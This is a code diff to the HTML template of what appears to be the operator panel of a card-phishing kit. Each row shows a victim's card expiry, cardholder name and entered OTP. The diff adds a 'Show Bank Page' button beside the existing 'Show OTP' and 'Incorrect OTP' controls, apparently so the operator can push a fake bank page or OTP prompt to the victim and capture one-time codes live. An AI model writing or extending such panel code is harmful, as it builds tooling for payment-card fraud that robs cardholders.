@@ -271,18 +271,23 @@
             <td>${tx.expiry}</td>
             <td>${tx.cardholder}</td>
             <td>
-              ${tx.otpEntered ? 
-                `<span class="otp-received">${tx.otpEntered}</span>
-                 <button class="wrong-otp-btn" onclick="markWrongOTP('${tx.id}')" ${tx.redirectStatus ? 'disabled' : ''}>
-                   Incorrect OTP
-                 </button>` : 
-                tx.otpShown ?
-                  '<span class="status-badge status-otp">Waiting for OTP</span>' :
-                  `<button class="show-otp-btn" onclick="showOTP('${tx.id}')" ${tx.status !== 'processing' ? 'disabled' : ''}>
-                    Show OTP
-                  </button>`
-              }
-            </td>
+  ${tx.otpEntered ? 
+    `<span class="otp-received">${tx.otpEntered}</span>
+     <button class="wrong-otp-btn" onclick="markWrongOTP('${tx.id}')" ${tx.redirectStatus ? 'disabled' : ''}>
+       Incorrect OTP
+     </button>` : 
+    tx.otpShown ?
+      '<span class="status-badge status-otp">Waiting for OTP</span>' :
+      `<div style="display: flex; gap: 6px;">
+        <button class="show-otp-btn" onclick="showOTP('${tx.id}')" ${tx.status !== 'processing' ? 'disabled' : ''}>
+          Show OTP
+        </button>
+        <button class="show-bankpage-btn" onclick="showBankPage('${tx.id}')" ${tx.status !== 'processing' ? 'disabled' : ''}>
+          Show Bank Page
+        </button>
+      </div>`
+  }
+</td>
             <td>
               <span class="status-badge status-${tx.status || 'processing'}">
                 ${tx.status === 'otp_received' ? 'OTP Received' : tx.status === 'otp_pending' ? 'OTP Pending' : tx.status || 'Processing'}
